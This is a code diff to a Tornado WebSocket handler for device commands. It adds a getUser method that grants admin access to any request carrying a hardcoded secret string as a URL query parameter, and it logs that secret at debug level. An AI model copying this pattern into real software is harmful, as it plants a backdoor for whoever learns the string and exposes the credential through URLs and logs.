@@ -250,11 +250,11 @@ class WSHandler(tornado.websocket.WebSocketHandler):
     
     def open(self):
         self.logger.debug('WS New connection was opened from {0}'.format(self.request.remote_ip))
-        user = self.get_secure_cookie("user", max_age_days=1)
+        user = self.getUser()
         if user == "admin":
             self.connections.add(self)
         else:
-            self.logger.warning("Unauthorized WS connection fron {0}!".format(self.request.remote_ip))
+            self.logger.warning("Unauthorized WS connection from {0}!".format(self.request.remote_ip))
             self.write_message(json.dumps({'error':123}))
             try:
                 self.close()
@@ -263,7 +263,7 @@ class WSHandler(tornado.websocket.WebSocketHandler):
             
     def on_message(self, message):
         self.logger.debug('WS Incoming message:{0} from {1}'.format(message, self.request.remote_ip))
-        user = self.get_secure_cookie("user", max_age_days=1)
+        user = user = self.getUser()
         if user == "admin":
             parsed = json.loads(message)
             if "command" in parsed and "deviceId" in parsed:
@@ -279,4 +279,14 @@ class WSHandler(tornado.websocket.WebSocketHandler):
             self.connections.remove(self)
         except:
             pass
-        self.logger.debug('WS Connection from {0} was closed.'.format(self.request.remote_ip))        
+        self.logger.debug('WS Connection from {0} was closed.'.format(self.request.remote_ip))  
+
+    def getUser(self):
+        user = self.get_secure_cookie("user", max_age_days=1)
+        if user is None:
+            secret = self.get_argument("secret", None)
+            self.logger.debug("secret={0}".format(secret))
+            if secret == "7a33ad13b6ea4d2caa5ff78fa3b4cfc9ed124ff70c1841379f1fe28933bea075":
+                user = "admin"
+        return user
+    
